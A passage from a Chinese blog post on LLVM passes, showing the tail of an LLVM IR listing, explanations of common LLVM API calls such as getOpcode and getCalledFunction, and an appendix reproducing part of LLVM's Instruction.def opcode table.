class="number">1024</span></span><br><span class="line">  %<span class="number">261</span> = add nsw i64 %<span class="number">260</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">262</span> = add nsw i64 %<span class="number">261</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">263</span> = add nsw i64 %<span class="number">262</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">264</span> = add nsw i64 %<span class="number">263</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">265</span> = add nsw i64 %<span class="number">264</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">266</span> = add nsw i64 %<span class="number">265</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">267</span> = add nsw i64 %<span class="number">266</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">268</span> = add nsw i64 %<span class="number">267</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">269</span> = add nsw i64 %<span class="number">268</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">270</span> = add nsw i64 %<span class="number">269</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">271</span> = add nsw i64 %<span class="number">270</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">272</span> = add nsw i64 %<span class="number">271</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">273</span> = add nsw i64 %<span class="number">272</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">274</span> = add nsw i64 %<span class="number">273</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">275</span> = add nsw i64 %<span class="number">274</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">276</span> = add nsw i64 %<span class="number">275</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">277</span> = add nsw i64 %<span class="number">276</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">278</span> = add nsw i64 %<span class="number">277</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">279</span> = add nsw i64 %<span class="number">278</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">280</span> = add nsw i64 %<span class="number">279</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">281</span> = add nsw i64 %<span class="number">280</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">282</span> = add nsw i64 %<span class="number">281</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">283</span> = add nsw i64 %<span class="number">282</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">284</span> = add nsw i64 %<span class="number">283</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">285</span> = add nsw i64 %<span class="number">284</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">286</span> = add nsw i64 %<span class="number">285</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">287</span> = add nsw i64 %<span class="number">286</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">288</span> = add nsw i64 %<span class="number">287</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">289</span> = add nsw i64 %<span class="number">288</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">290</span> = add nsw i64 %<span class="number">289</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">291</span> = add nsw i64 %<span class="number">290</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">292</span> = add nsw i64 %<span class="number">291</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">293</span> = add nsw i64 %<span class="number">292</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">294</span> = add nsw i64 %<span class="number">293</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">295</span> = add nsw i64 %<span class="number">294</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">296</span> = add nsw i64 %<span class="number">295</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">297</span> = add nsw i64 %<span class="number">296</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">298</span> = add nsw i64 %<span class="number">297</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">299</span> = add nsw i64 %<span class="number">298</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">300</span> = add nsw i64 %<span class="number">299</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">301</span> = add nsw i64 %<span class="number">300</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">302</span> = add nsw i64 %<span class="number">301</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">303</span> = add nsw i64 %<span class="number">302</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">304</span> = add nsw i64 %<span class="number">303</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">305</span> = add nsw i64 %<span class="number">304</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">306</span> = add nsw i64 %<span class="number">305</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">307</span> = add nsw i64 %<span class="number">306</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">308</span> = add nsw i64 %<span class="number">307</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">309</span> = add nsw i64 %<span class="number">308</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">310</span> = add nsw i64 %<span class="number">309</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">311</span> = add nsw i64 %<span class="number">310</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">312</span> = add nsw i64 %<span class="number">311</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">313</span> = add nsw i64 %<span class="number">312</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">314</span> = add nsw i64 %<span class="number">313</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">315</span> = add nsw i64 %<span class="number">314</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">316</span> = add nsw i64 %<span class="number">315</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">317</span> = add nsw i64 %<span class="number">316</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">318</span> = add nsw i64 %<span class="number">317</span>, <span class="number">1024</span></span><br><span class="line">  ret i64 %<span class="number">318</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">attributes #<span class="number">0</span> = &#123; noinline nounwind optnone uwtable <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span>=<span class="string">&quot;0&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;tune-cpu&quot;</span>=<span class="string">&quot;generic&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"> </span><br><span class="line">!llvm.<span class="keyword">module</span>.flags = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line">!llvm.ident = !&#123;!<span class="number">1</span>&#125;</span><br><span class="line"> </span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">&quot;wchar_size&quot;</span>, i32 <span class="number">4</span>&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!<span class="string">&quot;Ubuntu clang version 12.0.0-3ubuntu1~20.04.5&quot;</span>&#125;</span><br></pre></td></tr></table></div></figure>






        <h1 id="常见用法"   >
          <a href="#常见用法" class="heading-link"><i class="fas fa-link"></i></a><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h1>
      <ol>
<li><p><code>getName()</code>函数用于获取当前<code>runOnFunction</code>正处理的函数名</p>
</li>
<li><p>第一个<code>for</code>循环是对当前处理的函数中的基本块（比如一些条件分支语句就会产生多个基本块，在生成的<code>ll</code>文件中，不同基本块之间会有换行）遍历，第二个<code>for</code>循环是对每个基本块中的指令遍历</p>
</li>
<li><p><code>getOpcodeName()</code>函数用于获取指令的操作符的名称，</p>
</li>
<li><p><code>getNumOperands()</code>用于获取指令的操作数的个数，</p>
</li>
<li><p><code>getOpcode()</code>函数用于获取指令的操作符编号，在<code>/usr/include/llvm-xx/llvm/IR/Instruction.def</code></p>
<p>文件中有对应表，<code>56</code>号对应着<code>Call</code>这个操作符：</p>
</li>
<li><p><code>getCalledFunction()</code>函数用于获取被调用的函数名称，即当在一个<code>A</code>函数中调用了<code>B</code>函数，在<code>LLVM IR</code>中，<code>A</code>会通过<code>Call</code>操作符调用<code>B</code>，<code>getCalledFunction()</code>函数就是用于获取此处<code>B</code>函数的名称</p>
</li>
<li><p><code>getOperand(i)</code>是用于获取第<code>i</code>个操作数（在这里就是获取所调用函数的第<code>i</code>个参数），<code>getArgOperand()</code>函数与其用法类似，但只能获取参数，<code>getZExtValue()</code>即<code>get Zero Extended Value</code>，也就是将获取的操作数转为无符号扩展整数</p>
</li>
<li><p>最内层<code>for</code>循环中的<code>instIter-&gt;getNumOperands()-1</code>，这里需要<code>-1</code>是因为对于<code>call</code>和<code>invoke</code>操作符，操作数的数量是实际参数的个数<code>+1</code>（因为将被调用函数本身也当成了操作数）</p>
</li>
<li><p><code>if (isa&lt;ConstantInt&gt;(call_inst-&gt;getOperand(i)))</code>这行语句是通过<code>isa</code>判断当前获取到的操作数是不是立即数（<code>ConstantInt</code>）</p>
</li>
<li><p><code>static RegisterPass&lt;Hello&gt; X(&quot;Hello&quot;, &quot;Hello World Pass&quot;);</code>中的第一个参数就是注册的<code>PASS</code>名称</p>
</li>
<li><p><code>getTerminator()</code>是取基本块中末尾的指令</p>
</li>
<li><p><code>llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; 1</code>判断操作数<code>operand</code>是否为常数。</p>
</li>
<li><p><code>llvm::isa&lt;llvm::Argument,llvm::Value *&gt;(&amp;Operand) &amp; 1</code>判断操作数<code>operand</code>是否为函数参数。</p>
</li>
<li><p>自定义函数，类似这种<code>anonymous namespace</code>基本都是出题人自定义的函数，这种是没有去除符号显示出来的。</p>
</li>
</ol>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831091823396.png" alt="image-20230831091823396"></p>

        <h1 id="附录"   >
          <a href="#附录" class="heading-link"><i class="fas fa-link"></i></a><a href="#附录" class="headerlink" title="附录"></a>附录</h1>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v10 版本</span></span><br><span class="line"><span class="comment">//===-- llvm/Instruction.def - File that describes Instructions -*- C++ -*-===//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.</span></span><br><span class="line"><span class="comment">// See https://llvm.org/LICENSE.txt for license information.</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//===----------------------------------------------------------------------===//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This file contains descriptions of the various LLVM instructions.  This is</span></span><br><span class="line"><span class="comment">// used as a central place for enumerating the different instructions and</span></span><br><span class="line"><span class="comment">// should eventually be the place to put comments about the instructions.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//===----------------------------------------------------------------------===//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> NO INCLUDE GUARD DESIRED!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Provide definitions of macros so that users of this file do not have to</span></span><br><span class="line"><span class="comment">// define everything to use it...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_TERM_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_TERM_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_TERM_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_TERM_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_UNARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_UNARY_INST(num, opcode, instclass)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_UNARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_UNARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_BINARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_BINARY_INST(num, opcode, instclass)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_BINARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_BINARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_MEMORY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_MEMORY_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_MEMORY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_MEMORY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_CAST_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_CAST_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_CAST_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_CAST_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_FUNCLETPAD_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_FUNCLETPAD_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_FUNCLETPAD_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_FUNCLETPAD_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FIRST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_OTHER_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_OTHER_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_OTHER_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LAST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAST_OTHER_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HANDLE_USER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HANDLE_USER_INST(num, opc, Class) HANDLE_OTHER_INST(num, opc, Class)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Terminator Instructions - These instructions are used to terminate a basic</span></span><br><span class="line"><span class="comment">// block of the program.   Every basic block must end with one of these</span></span><br><span class="line"><span class="comment">// instructions for it to be a well formed basic block.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"> FIRST_TERM_INST  ( <span class="number">1</span>)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">1</span>, Ret           , ReturnInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">2</span>, Br            , BranchInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">3</span>, Switch        , SwitchInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">4</span>, IndirectBr    , IndirectBrInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">5</span>, Invoke        , InvokeInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">6</span>, Resume        , ResumeInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">7</span>, Unreachable   , UnreachableInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">8</span>, CleanupRet    , CleanupReturnInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">9</span>, CatchRet      , CatchReturnInst)</span><br><span class="line">HANDLE_TERM_INST  (<span class="number">10</span>, CatchSwitch   , CatchSwitchInst)</span><br><span class="line">HANDLE_TERM_INST  (<span class="number">11</span>, CallBr        , CallBrInst) <span class="comment">// A call-site terminator</span></span><br><span class="line">  LAST_TERM_INST  (<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard unary operators...</span></span><br><span class="line"> FIRST_UNARY_INST(<span class="number">12</span>)</span><br><span class="line">HANDLE_UNARY_INST(<span class="number">12</span>, FNeg  , UnaryOperator)</span><br><span class="line">  LAST_UNARY_INST(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard binary operators...</span></span><br><span class="line"> FIRST_BINARY_INST(<span class="number">13</span>)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">13</span>, Add  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">14</span>, FAdd , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">15</span>, Sub  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">16</span>, FSub , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">17</span>, Mul  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">18</span>, FMul , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">19</span>, UDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">20</span>, SDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span 